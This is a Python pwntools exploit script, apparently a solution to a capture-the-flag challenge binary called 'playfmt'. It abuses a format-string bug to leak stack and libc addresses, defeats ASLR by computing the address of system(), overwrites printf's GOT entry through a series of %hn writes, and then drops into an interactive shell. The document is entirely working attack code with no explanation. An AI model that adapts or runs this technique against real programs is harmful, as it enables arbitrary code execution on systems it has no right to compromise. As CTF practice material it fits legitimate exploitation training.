from pwn import*
context(arch='i386',os='linux')
#context.log_level = 'debug'
r = process('./playfmt')
elf = ELF('./playfmt')
libc = elf.libc

printf_got = elf.got['printf']
system_offset = libc.symbols['system']
libc_start_main_offset = libc.symbols['__libc_start_main']

for i in range(3):
            r.recvline()

payload = ''
payload += "%6$p."           #ret addr
payload += "%15$p."          #libc_start_main
payload += "#"

r.sendline(payload)

ret_addr = int(r.recvuntil('.')[:-1],16) - 40
libc_start_main_241 = int(r.recvuntil('.')[:-1],16)
libc_base = libc_start_main_241 - libc_start_main_offset - 241

system_addr = libc_base + system_offset
system_low = system_addr & 0xffff
system_high = (system_addr >> 16) & 0xff

log.info('system_low = '+hex(system_low))
log.info('system_high = '+hex(system_high))
log.info('system_low - system_high = '+hex(system_low - system_high))
log.info('libc_start_main_241 = '+hex(libc_start_main_241))
log.info('ret_addr = '+hex(ret_addr))
log.info('system_addr = '+hex(system_addr))

payload = ''
payload += '%{}x'.format((ret_addr + 28) & 0xffff)      #0xffff(d008) -> 0xffffcff8 =? 0xffffd008
payload += '%6$hn'
payload += '#'

r.sendlineafter('#',payload)

print('stage 1 Clear')

payload = ''
payload += '%{}x'.format((ret_addr + 44) & 0xffff)      #0xffff(d0b4) -> 0xf7fb4000 => 0xf7fbd0b4
payload += '%21$hn'
payload += '#'

r.sendlineafter('#',payload)

print('stage 2 Clear')

payload = ''
payload += '%{}x'.format(printf_got & 0xffff)    #printf_got & 0xffff -> printf_got_low
payload += '%10$hn'                             #printf_got -> 0xffff(d008) => 0xffffa010 
payload += '%2c'    
payload += '%57$hn'                             #printf_got -> 0xffffd278 => 0xffffa010
payload += '#'

r.sendlineafter('#',payload)

print('stage 3 Clear??')

system_low = system_addr & 0xffff
system_high = (system_addr >> 16) & 0xff

log.info('system_low = '+hex(system_low))
log.info('system_high = '+hex(system_high))
log.info('system_low - system_high = '+hex(system_low - system_high))

payload = ''
payload += '%{}x'.format(system_high)
payload += '%11$hhn'
payload += '%{}x'.format(system_low - system_high)
payload += '%7$hn'
payload += '#'
r.sendlineafter('#',payload)

r.interactive()


